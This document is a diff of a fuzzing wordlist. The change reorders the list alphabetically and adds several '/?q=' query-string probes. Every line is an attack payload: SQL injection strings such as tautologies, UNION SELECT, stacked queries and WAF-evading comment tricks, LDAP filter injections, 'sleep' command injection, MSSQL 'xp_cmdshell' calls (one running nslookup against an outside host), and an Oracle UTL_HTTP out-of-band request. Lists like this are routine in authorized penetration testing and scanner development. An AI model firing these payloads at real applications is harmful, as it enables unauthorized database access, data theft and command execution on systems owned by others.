@@ -1,131 +1,144 @@
-'
+
+!
 "
-#
--
---
-'%20--
---';
-'%20;
-=%20'
-=%20;
-=%20--
-\x23
-\x27
-\x3D%20\x3B'
-\x3D%20\x27
-\x27\x4F\x52 SELECT *
-\x27\x6F\x72 SELECT *
-'or%20select *
-admin'--
-<>"'%;)(&+
-'%20or%20''='
-'%20or%20'x'='x
-"%20or%20"x"="x
-')%20or%20('x'='x
-0 or 1=1
-' or 0=0 --
-" or 0=0 --
-or 0=0 --
-' or 0=0 #
-" or 0=0 #
-or 0=0 #
-' or 1=1--
-" or 1=1--
-' or '1'='1'--
-"' or 1 --'"
-or 1=1--
-or%201=1
-or%201=1 --
-' or 1=1 or ''='
-" or 1=1 or ""="
-' or a=a--
 " or "a"="a
-') or ('a'='a
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"%20or%20"x"="x
+"' or 1 --'"
 ") or ("a"="a
-hi" or "a"="a
-hi" or 1=1 --
-hi' or 1=1 --
-hi' or 'a'='a
-hi') or ('a'='a
-hi") or ("a"="a
-'hi' or 'x'='x';
-@variable
-,@variable
-PRINT
-PRINT @@variable
-select
-insert
-as
-or
-procedure
-limit
-order by
-asc
-desc
-delete
-update
-distinct
-having
-truncate
-replace
-like
-handler
-bfilename
-' or username like '%
-' or uname like '%
-' or userid like '%
-' or uid like '%
-' or user like '%
-exec xp
-exec sp
-'; exec master..xp_cmdshell
-'; exec xp_regread
-t'exec master..xp_cmdshell 'nslookup www.google.com'--
---sp_password
-\x27UNION SELECT
-' UNION SELECT
-' UNION ALL SELECT
-' or (EXISTS)
-' (select top 1
-'||UTL_HTTP.REQUEST
-1;SELECT%20*
-to_timestamp_tz
-tz_offset
-&lt;&gt;&quot;'%;)(&amp;+
-'%20or%201=1
-%27%20or%201=1
+#
 %20$(sleep%2050)
 %20'sleep%2050'
-char%4039%41%2b%40SELECT
-&apos;%20OR
-'sqlattempt1
-(sqlattempt2)
-|
-%7C
-*|
-%2A%7C
-*(|(mail=*))
-%2A%28%7C%28mail%3D%2A%29%29
-*(|(objectclass=*))
-%2A%28%7C%28objectclass%3D%2A%29%29
-(
-%28
-)
-%29
-&
-%26
-!
 %21
-' or 1=1 or ''='
+%26
+%27%20UNION%20Select%201,2--+
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+'
+' (select top 1
+' UNION ALL SELECT
+' UNION SELECT
 ' or ''='
-x' or 1=1 or 'x'='y
+' or '1'='1'--
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' order by 1,2--+
+'%20--
+'%20;
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+') or ('a'='a
+')%20or%20('x'='x
+'--+
+'; exec master..xp_cmdshell
+'; exec xp_regread
+'hi' or 'x'='x';
+'or%20select *
+'sqlattempt1
+'||UTL_HTTP.REQUEST
+(
+(sqlattempt2)
+)
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+,@variable
+-
+--
+--';
+--sp_password
 /
 //
 //*
-*/*
-'--+
-' order by 1,2--+
-%27%20UNION%20Select%201,2--+
-AND 0 order by 1—
+/?q='or''='
+/?q=1
+/?q=1 or 1=1
+/?q=1"
+/?q=1'
+/?q=1' or '1'='1
+/?q=1'||'asd'||'
+/?q=1/*!1111'*/
+/?q=1/*'*/
+/?q=1\
+/?q=1`
+/?q=[1]
+/?q[]=1
+0 or 1=1
+1;SELECT%20*
+<>"'%;)(&+
+=%20'
+=%20--
+=%20;
+@variable
 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5 —
-
+AND 0 order by 1—
+PRINT
+PRINT @@variable
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D%20\x27
+\x3D%20\x3B'
+`
+admin'--
+as
+asc
+bfilename
+char%4039%41%2b%40SELECT
+delete
+desc
+distinct
+exec sp
+exec xp
+handler
+having
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+insert
+like
+limit
+or
+or 0=0 #
+or 0=0 --
+or 1=1--
+or%201=1
+or%201=1 --
+order by
+procedure
+replace
+select
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+update
+x' or 1=1 or 'x'='y
+|
